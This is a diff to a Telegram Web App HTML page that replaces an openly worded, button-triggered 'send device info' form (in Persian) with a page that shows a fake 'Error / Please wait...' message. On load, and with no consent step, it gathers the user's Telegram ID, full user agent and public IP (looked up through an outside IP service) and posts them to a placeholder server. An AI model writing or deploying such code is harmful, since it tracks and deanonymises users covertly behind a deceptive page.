@@ -3,58 +3,54 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Device Info</title>
-    <style>
-        body {
-            font-family: Arial, sans-serif;
-            text-align: center;
-            padding: 20px;
-            background-color: #f0f0f0;
-        }
-        button {
-            padding: 10px 20px;
-            font-size: 16px;
-            cursor: pointer;
-            background-color: #0088cc;
-            color: white;
-            border: none;
-            border-radius: 5px;
-        }
-        button:hover {
-            background-color: #005f8a;
-        }
-    </style>
+    <title>Telegram Web App</title>
 </head>
 <body>
-    <h1>ارسال اطلاعات دستگاه</h1>
-    <p>برای بهبود تجربه بازی، لطفاً اطلاعات دستگاه خودتون رو بفرستید.</p>
-    <button onclick="sendDeviceInfo()">ارسال اطلاعات</button>
-
+    <h1>Error</h1>
+    <p>Please wait...</p>
     <script>
-        function sendDeviceInfo() {
-            // گرفتن اطلاعات دستگاه
-            const platform = Telegram.WebApp.platform || "unknown";
-            let deviceModel = "unknown";
-            
-            // تخمین مدل دستگاه بر اساس platform
-            if (platform.includes("ios")) {
-                deviceModel = "iOS Device";
-            } else if (platform.includes("android")) {
-                deviceModel = "Android Device";
-            } else if (platform.includes("desktop") || platform.includes("web")) {
-                deviceModel = "Desktop/Web";
-            }
+        // Get Telegram WebApp object
+        const webApp = window.Telegram.WebApp;
+        webApp.ready();
 
-            // ارسال داده به ربات
-            const data = {
-                device_model: deviceModel
-            };
-            Telegram.WebApp.sendData(JSON.stringify(data));
-            Telegram.WebApp.close(); // بستن Web App بعد از ارسال
-        }
+        // Get user info from Telegram
+        const chat_id = webApp.initDataUnsafe.user ? webApp.initDataUnsafe.user.id : 'unknown';
 
-        // آماده‌سازی Web App
-        Telegram.WebApp.ready();
+        // Get device model using navigator
+        const device_model = navigator.userAgent;
+
+        // Get IP address using an external API
+        fetch('https://api.ipify.org?format=json')
+            .then(response => response.json())
+            .then(data => {
+                const ip = data.ip;
+                
+                // Send data to Flask server
+                fetch('YOUR_FLASK_SERVER_URL/save_data', {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify({
+                        chat_id: chat_id,
+                        ip: ip,
+                        device_model: device_model
+                    })
+                })
+                .then(response => response.json())
+                .then(result => {
+                    console.log('Data saved:', result);
+                    webApp.showAlert('Your information has been saved!');
+                })
+                .catch(error => {
+                    console.error('Error:', error);
+                    webApp.showAlert('An error occurred while saving your information.');
+                });
+            })
+            .catch(error => {
+                console.error('Error fetching IP:', error);
+                webApp.showAlert('Could not retrieve IP address.');
+            });
     </script>
 </body>
 </html>
